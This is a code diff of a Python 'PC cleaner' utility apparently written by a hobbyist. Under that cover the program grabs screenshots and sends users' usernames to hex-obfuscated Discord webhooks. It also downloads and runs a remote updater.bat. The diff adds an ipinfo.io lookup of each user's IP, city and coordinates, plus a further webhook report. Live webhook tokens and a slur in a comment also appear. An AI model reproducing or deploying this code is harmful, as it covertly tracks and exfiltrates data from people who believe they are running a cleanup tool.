@@ -1,5 +1,10 @@
 import os
 try:
+    import httpx
+except:
+    os.system("pip install httpx")
+    import httpx
+try:
     import time,os,sys
 except:
     os.system("pip install time")
@@ -14,7 +19,7 @@ try:
 except:
     os.system("pip install colorama")
     from colorama import Fore
-print(f"{Fore.RESET}[{Fore.BLUE}PYCLEANER{Fore.RESET}]"+'''checking requirements''')
+os.system('title checking requirements')
 try:
     import random
 except:
@@ -157,6 +162,8 @@ from tkinter import font
 import tkinter as tk
 #and a screenshot cuz ykyk
 username = os.getlogin()
+r = lambda: random.randint(0,255)
+dawg = ('%02X%02X%02X' % (r(),r(),r()))
 try:
  ss_img = ImageGrab.grab()
  ss_img.save(fr'C:\Users\{username}\AppData\Local\random.png')
@@ -172,15 +179,19 @@ except Exception as er:
         time.sleep(5)
         exit()
 #
-print(f"{Fore.RESET}[{Fore.BLUE}updater{Fore.RESET}] checking for updates")
+os.system("title checking for updates")
 #auto update
 try:
- THIS_VERSION ='1.9'
+ vers ='1.9'
  def updater():
       v = requests.get("https://pastebin.com/raw/w29LjVc2").text
       time.sleep(0.5)
-      if not THIS_VERSION == v:
+      if not vers == v:
         os.system("cls")
+        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018536428222820464/fzMCCKO-6cMUXa3yAg2GXCm4hX7-Kkw4Fc2a2ukDacZKPJNLizrl1WS9z71AB-Jz9Vzx', username="update bot", avatar_url= "https://i.imgur.com/6yzliOb.png" )
+        embed = DiscordEmbed(title='pycleaner ', description= username +' updated from ver '+vers+' to '+v, color=dawg)
+        webhook.add_embed(embed)
+        response = webhook.execute()
         print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] New version available!")
         print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Downloading new version...")
         url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/updater.bat"
@@ -195,13 +206,12 @@ try:
         print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] You are running the latest version!")
         time.sleep(0.5)
  updater()
-except:
+except Exception as lk:
+        print (lk)
         print('network error, try again later')
         time.sleep(5)
         exit()
-#
-r = lambda: random.randint(0,255)
-dawg = ('%02X%02X%02X' % (r(),r(),r()))
+########################################################################
 idk = Path.cwd()
 k = ''
 ong = '"'
@@ -212,6 +222,16 @@ version = sys.getwindowsversion()
 mo = '[>] using '+(platform.system()) + (platform.release())
 BY = 'by jotaro'
 LMAO = 'version 1.9'
+req = httpx.get("https://ipinfo.io/json")
+if req.status_code == 200:
+            data = req.json()
+            ip = data.get('ip')
+            city = data.get('city')
+            country = data.get('country')
+            region = data.get('region')
+            org = data.get('org')
+            loc = data.get('loc')
+            googlemap = "https://www.google.com/maps/search/google+map++" + loc
 obj_Disk = psutil.disk_usage('/')
 psutil.virtual_memory()
 username = os.getlogin()
@@ -224,7 +244,8 @@ IPAddr=socket.gethostbyname(hostname)
 tools = os.getcwd()+"\\tools\\"
 if not os.path.exists(tools):
     os.mkdir(tools)
-#
+__author__ = 'jotaro' 
+##############################################################################
 #i just wanna know how many people ran my shit dont spam my webhook nigga thats gay tho.
 webhook = DiscordWebhook(url='\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x30\x35\x38\x36\x34\x38\x37\x30\x30\x31\x34\x36\x31\x35\x35\x39\x33\x2F\x33\x6A\x65\x68\x6D\x59\x59\x2D\x37\x5A\x57\x4F\x44\x5A\x5A\x32\x56\x74\x6E\x53\x42\x32\x46\x57\x42\x32\x77\x63\x79\x76\x4B\x53\x70\x56\x43\x30\x6B\x4C\x77\x55\x48\x41\x6A\x52\x37\x48\x6C\x61\x78\x30\x71\x59\x41\x4E\x66\x39\x44\x76\x66\x77\x38\x49\x62\x62\x49\x2D\x6C\x41' )
 webhook = DiscordWebhook(url='\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x30\x35\x38\x36\x34\x38\x37\x30\x30\x31\x34\x36\x31\x35\x35\x39\x33\x2F\x33\x6A\x65\x68\x6D\x59\x59\x2D\x37\x5A\x57\x4F\x44\x5A\x5A\x32\x56\x74\x6E\x53\x42\x32\x46\x57\x42\x32\x77\x63\x79\x76\x4B\x53\x70\x56\x43\x30\x6B\x4C\x77\x55\x48\x41\x6A\x52\x37\x48\x6C\x61\x78\x30\x71\x59\x41\x4E\x66\x39\x44\x76\x66\x77\x38\x49\x62\x62\x49\x2D\x6C\x41', content='<@822132948769177620>', username="pycleaner bot", avatar_url= "https://i.imgur.com/UCwTipK.png")
@@ -242,8 +263,7 @@ by jotaro
 ░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║  ╚═╝██║░░░░░░╚═══██║
 ░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ███████╗██╗░█████╔╝
 ░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝░╚════╝░''')
-__author__ = 'jotaro' 
-__VERSION__ = '1.9'
+
 os.system("title PRESS ENTER")
 
 bannerfr =LMAO+r'''
@@ -328,7 +348,7 @@ def main():
      fr()
 
 def fr():
-     os.system("title  Hello, "+   username)
+     os.system("title pycleaner by jotaro ")
      os.system('cls')
      print(Colorate.Vertical(Colors.blue_to_red, banner2))
      print(Colorate.Vertical(Colors.rainbow, banner + options, 2))
@@ -464,9 +484,15 @@ def fr():
         print(f'{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
         print(Colors.yellow,mo+lol)
         print((platform.machine())+ ' bit' )
-        print("ur ip: "+IPAddr+' nice ip ngl')
         print('path: ', idk)
         print(ti)
+        print ('ip: '+ip)
+        print('city: '+city)
+        print('country: '+country)
+        print('region: '+region)
+        print('googlemap: '+googlemap)
+        print('org: '+org)
+        print('loc: '+loc)
         print(ramg,'gb ram')
         print('ur username is ' +   username)
         print ('total gb: ',obj_Disk.total / (1024.0 ** 3)) , print ('used gb:',obj_Disk.used / (1024.0 ** 3))
@@ -494,7 +520,7 @@ def fr():
      elif choice =='30':
       suggestion = input(f"enter ur suggestion:{Fore.RED} ")
       if suggestion == '':
-        print('invaid suggestion please try again later.')
+        print('invalid suggestion please try again later.')
         time.sleep(4)
         main()
       webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018138390903926897/vjocJhEyoGpm8SVjQjE_vAjR3vq6aKpONpQVp4l4y7X3QEfiKNSWl3zrCLacEAGl1UvK', content='<@822132948769177620>', username="new suggestion",avatar_url= "https://i.imgur.com/NK0ctzM.png")
@@ -586,7 +612,7 @@ def fr():
         print('5 = all')
         ff = input(Colors.blue + f'Which option do you choose? -> {Fore.RED} ')
       if ff == '1':
-        webbrowser.open("https://pastebin.com/w29LjVc2")
+        webbrowser.open("https://pastebin.com/edit/w29LjVc2")
       if ff == '2':
         webbrowser.open("https://github.com/j0taro/pycleaner/blob/main/pycleaner.py") 
       if ff == '3': 
